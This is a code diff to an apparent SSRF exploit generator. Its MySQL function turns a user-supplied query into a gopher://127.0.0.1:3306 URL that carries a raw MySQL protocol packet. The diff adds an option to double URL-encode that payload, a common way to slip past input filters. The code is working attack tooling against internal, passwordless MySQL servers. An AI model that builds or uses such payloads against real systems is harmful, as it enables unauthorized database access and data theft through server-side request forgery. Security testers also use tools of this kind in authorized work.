@@ -1,3 +1,5 @@
+import urllib.parse
+
 def MySQL():
     print("\033[31m" + "For making it work username should not be password protected!!!" + "\033[0m")
     user = input("\033[96m" + "\nGive MySQL username: " + "\033[0m")
@@ -13,12 +15,16 @@ def MySQL():
     dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c"
 
     query = input("\033[96m" + "Give query to execute: " + "\033[0m")
+    doubleEncode = input("\033[96m" + "Do you need double encode? (y/n): " + "\033[0m").strip().lower()
 
     auth = dump.replace("\n", "")
 
     def encode(s):
         a = [s[i:i + 2] for i in range(0, len(s), 2)]
-        return "gopher://127.0.0.1:3306/_%" + "%".join(a)
+        encoded = "gopher://127.0.0.1:3306/_%" + "%".join(a)
+        if "y" in doubleEncode:
+            encoded = encoded[:encoded.index('/_') + 2] + urllib.parse.quote(encoded[encoded.index('/_') + 2:])
+        return encoded
 
     def get_payload(query):
         if query.strip() != '':
